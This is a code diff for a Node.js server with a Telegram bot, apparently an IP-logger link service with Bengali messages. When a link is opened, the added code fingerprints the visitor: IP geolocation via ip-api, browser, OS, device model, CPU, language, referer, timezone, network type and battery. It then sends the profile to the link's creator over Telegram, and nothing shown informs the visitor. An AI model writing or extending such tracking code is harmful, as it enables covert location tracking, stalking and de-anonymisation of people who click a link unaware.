@@ -1,30 +1,76 @@
 const path = require('path');
 const https = require('https');
 const { Markup } = require('telegraf');
-const { parseUserAgent } = require('./visitor');
+const UAParser = require('ua-parser-js');
 const { CATEGORY_CONFIGS } = require('./category');
 
 function setupRoutes(app, db, saveDB, bot) {
     app.post('/api/get-content', async (req, res) => {
         try {
             const linkId = req.body.id;
+            const clientInfo = req.body.clientInfo || {};
             const data = db.linkDatabase[linkId];
             if (!data) return res.json({ success: false });
-            
-            bot.telegram.sendMessage(data.userId, `👀 লিংক ওপেন করা হয়েছে!\nলিংক আইডি: ${linkId}`).catch(() => {});
             
             let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
             let ip = rawIp.split(',')[0].trim();
             if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
             
             const userAgent = req.headers['user-agent'] || "";
-            const { os, browser } = parseUserAgent(userAgent);
+            const ua = new UAParser(userAgent);
+            const browser = ua.getBrowser();
+            const os = ua.getOS();
+            const device = ua.getDevice();
+            const cpu = ua.getCPU();
+            const engine = ua.getEngine();
+            
+            const browserInfo = `${browser.name || 'Unknown'} (Ver: ${browser.version || 'N/A'})`;
+            const osInfo = `${os.name || 'Unknown'} (Ver: ${os.version || 'N/A'})`;
+            const deviceInfo = `Type: ${device.type || 'Desktop/Unknown'}, Vendor: ${device.vendor || 'N/A'}, Model: ${device.model || 'N/A'}`;
+            const cpuInfo = cpu.architecture || 'Unknown';
+            const engineInfo = `${engine.name || 'Unknown'} ${engine.version || ''}`.trim();
+            const acceptLanguage = req.headers['accept-language'] || 'N/A';
+            const referer = req.headers['referer'] || 'Direct/Unknown';
+            
             const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
             
             let visitorObj = {
-                time: currentTimeString, ip: ip, country: "Unknown", city: "Unknown", isp: "Unknown", os: os, browser: browser
+                time: currentTimeString, 
+                ip: ip, 
+                country: "Unknown", 
+                city: "Unknown", 
+                isp: "Unknown", 
+                browser: browserInfo,
+                os: osInfo,
+                device: deviceInfo,
+                cpu: cpuInfo,
+                engine: engineInfo,
+                language: acceptLanguage.split(',')[0],
+                referer: referer,
+                timezone: clientInfo.timezone || "Unknown",
+                network: clientInfo.network || "Unknown",
+                battery: clientInfo.battery || "Unknown"
             };
             
+            const notifyAdmin = (vData) => {
+                const msg = `👀 লিংক ওপেন করা হয়েছে!\n` +
+                            `🔗 লিংক আইডি: ${linkId}\n` +
+                            `🌐 IP: ${vData.ip}\n` +
+                            `📍 লোকেশন: ${vData.city}, ${vData.country} (ISP: ${vData.isp})\n` +
+                            `💻 ব্রাউজার: ${vData.browser}\n` +
+                            `📱 অপারেটিং সিস্টেম: ${vData.os}\n` +
+                            `📟 ডিভাইস: ${vData.device}\n` +
+                            `⚙️ ইঞ্জিন: ${vData.engine}\n` +
+                            `🖲️ CPU: ${vData.cpu}\n` +
+                            `🗣️ ভাষা: ${vData.language}\n` +
+                            `🔗 সোর্স/রেফারার: ${vData.referer}\n` +
+                            `🌍 টাইমজোন: ${vData.timezone}\n` +
+                            `📶 নেটওয়ার্ক: ${vData.network}\n` +
+                            `🔋 ব্যাটারি: ${vData.battery}\n` +
+                            `🕒 সময়: ${vData.time}`;
+                bot.telegram.sendMessage(data.userId, msg).catch(() => {});
+            };
+
             if (ip && ip !== "127.0.0.1" && ip !== "::1") {
                 https.get(`https://ip-api.com/json/${ip}`, (apiRes) => {
                     let body = "";
@@ -41,16 +87,19 @@ function setupRoutes(app, db, saveDB, bot) {
                         if (!data.visitors) data.visitors = [];
                         data.visitors.push(visitorObj);
                         saveDB();
+                        notifyAdmin(visitorObj);
                     });
                 }).on('error', () => {
                     if (!data.visitors) data.visitors = [];
                     data.visitors.push(visitorObj);
                     saveDB();
+                    notifyAdmin(visitorObj);
                 });
             } else {
                 if (!data.visitors) data.visitors = [];
                 data.visitors.push(visitorObj);
                 await saveDB();
+                notifyAdmin(visitorObj);
             }
             
             if (data.countdown && new Date(data.countdown) > new Date()) {
